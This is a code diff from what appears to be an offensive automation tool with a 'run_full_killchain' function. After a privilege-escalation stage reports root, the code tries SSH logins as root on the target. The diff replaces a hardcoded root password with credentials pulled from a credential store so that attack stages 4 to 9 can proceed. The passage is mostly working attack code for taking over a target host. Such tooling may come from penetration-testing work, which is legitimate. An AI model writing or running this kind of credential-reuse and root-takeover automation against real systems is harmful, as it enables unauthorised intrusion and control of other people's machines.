@@ -79,18 +79,21 @@ def run_full_killchain(target: str, user: str = None, password: str = None,
         if "ROOT ACCESS CONFIRMED" in privesc_output or "uid=0(root)" in privesc_output:
             re_authed = False
 
-            # Method 1: Try password auth as root:octopus
+            # Method 1: Try root with known credentials from credential store
             try:
-                test_client, test_err = _ssh_connect(target, "root", "octopus", port)
+                from tools import get_best_creds_for_target
+                root_creds = get_best_creds_for_target(target, "ssh")
+                root_pass = root_creds.get("password", password) if root_creds else password
+                test_client, test_err = _ssh_connect(target, "root", root_pass, port)
                 if test_client:
                     test_client.close()
                     eff_user = "root"
-                    eff_pass = "octopus"
+                    eff_pass = root_pass
                     re_authed = True
-                    print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root:octopus{C_RESET}")
-                    full_output += f"\n[+] Re-authenticated as root:octopus for stages 4-9\n"
-            except Exception:
-                pass
+                    print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root (credential store){C_RESET}")
+                    full_output += f"\n[+] Re-authenticated as root for stages 4-9\n"
+            except Exception as e:
+                logger.debug(f"Root re-auth via credential store failed: {e}")
 
             # Method 2: Try SSH key auth as root
             if not re_authed:
